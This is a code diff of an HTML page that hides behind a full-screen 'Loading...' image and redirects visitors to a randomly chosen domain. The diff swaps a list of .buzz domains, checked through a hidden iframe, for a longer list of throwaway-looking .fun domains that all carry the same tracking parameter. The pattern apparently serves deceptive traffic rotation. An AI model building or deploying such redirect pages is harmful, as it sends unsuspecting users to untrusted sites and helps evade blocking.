@@ -9,19 +9,19 @@
             margin: 0;
             padding: 0;
             height: 100%;
-            overflow: hidden; 
+            overflow: hidden;
         }
         #loadingImage {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%; 
+            width: 100%;
             height: 100%;
-            object-fit: cover; 
-            z-index: 999; 
+            object-fit: cover;
+            z-index: 999;
         }
         #testFrame {
-            display: none; 
+            display: none;
         }
     </style>
 </head>
@@ -29,66 +29,22 @@
 
     <img id="loadingImage" src="start_page.png" alt="Loading...">
 
-    <iframe id="testFrame"></iframe>
-
     <script>
         const urls = [
-           "https://2sb31y.buzz?f=1090114",    
-            "https://nm87s0.buzz?f=1090114",
-            "https://53f9mv.buzz?f=1090114",
-            "https://91drd8.buzz?f=1090114",
-            "https://us3r28.buzz?f=1090114",
-            "https://j109cs.buzz?f=1090114",
-            "https://abc8abc8.ink?f=1090114",
-            "https://abc8abc8.xyz?f=1090114",
-            "https://abc8abc8.pro?f=1090114",
-            "https://g8x2k5.buzz?f=1090114",
-            "https://h3x7v2.buzz?f=1090114",
-            "https://h8d1f3.buzz?f=1090114"
+            "https://081ps.fun?f=1090114" , "https://0aqsu.fun?f=1090114" , "https://0gg4y.fun?f=1090114" , "https://0sa4n.fun?f=1090114" , "https://0sftd.fun?f=1090114" , "https://1eek9.fun?f=1090114" , "https://1t950.fun?f=1090114" , "https://27uwr.fun?f=1090114" , "https://2r0sq.fun?f=1090114" , "https://3887i.fun?f=1090114" , "https://3e26p.fun?f=1090114" , "https://3m3d0.fun?f=1090114" , "https://4cp8x.fun?f=1090114" , "https://5ivug.fun?f=1090114" , "https://6f57f.fun?f=1090114" ,
         ];
 
-        const testFrame = document.getElementById('testFrame');
         const loadingImage = document.getElementById('loadingImage');
-        const timeoutDuration = 5000;
-        let checkedUrls = new Set();
-        function checkRandomUrl() {
-            if (checkedUrls.size === urls.length) {
-                loadingImage.style.display = 'none';
-                console.log('No accessible URLs found.');
-                return;
-            }
 
-            let randomIndex;
-            do {
-                randomIndex = Math.floor(Math.random() * urls.length);
-            } while (checkedUrls.has(randomIndex));
-
-            const url = urls[randomIndex];
-            checkedUrls.add(randomIndex);
-
-            console.log(`Checking: ${url}`);
-
-            let loadTimeout = setTimeout(() => {
-                console.error(`Timeout loading ${url}`);
-                checkRandomUrl();
-            }, timeoutDuration);
-
-            testFrame.onload = function() {
-                clearTimeout(loadTimeout); 
-                loadingImage.style.display = 'none';
-                window.location.href = url;
-            };
-
-            testFrame.onerror = function() {
-                clearTimeout(loadTimeout);
-                console.error(`Failed to load ${url}`);
-                checkRandomUrl();
-            };
-
-            testFrame.src = url;    
+        function getRandomUrl() {
+          const randomIndex = Math.floor(Math.random() * urls.length);
+          const selectedUrl = urls[randomIndex];
+          return selectedUrl;
         }
-
-        checkRandomUrl();
+        const randomUrl = getRandomUrl();
+        loadingImage.style.display = 'none';
+        window.location.href = randomUrl;
+        
     </script>
 
 </body>
